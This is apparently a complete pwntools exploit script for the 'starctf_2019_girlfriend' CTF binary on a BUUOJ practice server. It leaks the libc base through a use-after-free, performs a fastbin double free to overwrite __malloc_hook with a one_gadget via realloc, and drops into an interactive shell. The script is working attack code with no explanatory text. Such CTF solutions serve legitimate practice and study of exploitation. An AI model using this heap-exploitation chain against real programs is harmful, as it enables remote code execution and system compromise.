from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('starctf_2019_girlfriend')
io = remote('node4.buuoj.cn', 27265)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('starctf_2019_girlfriend')
# one_gadgets_1604 = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadgets_1604 = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def add(size, name):
    io.sendlineafter('Input your choice:', '1')
    io.sendlineafter('Please input the size of girl\'s name\n', str(size))
    io.sendafter('please inpute her name:\n', name)
    io.sendafter('please input her call:\n', '111111111111')


def show(index):
    io.sendlineafter('Input your choice:', '2')
    io.sendlineafter('Please input the index:', str(index))


def delete(index):
    io.sendlineafter('Input your choice:', '4')
    io.sendlineafter('Please input the index:', str(index))



def leak():
    global libc_base
    add(0x88, 'name0')
    add(0x68, 'name1')
    delete(0)
    show(0)
    io.recvuntil('name:\n')
    libc_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))

def pwn():
    add(0x68, 'name2')
    delete(1)
    delete(2)
    delete(1)
    add(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 0x23))
    add(0x68, 'name2')
    add(0x68, 'name1')
    payload = cyclic(0xb) + p64(libc_base + one_gadgets_1604[3]) + p64(libc_base + libc.sym['realloc'] + 2)
    add(0x68, payload)
    # gdb.attach(io)
    io.sendlineafter('Input your choice:', '1')
    # pause()
    io.interactive()


if __name__ == '__main__':
    leak()
    pwn()
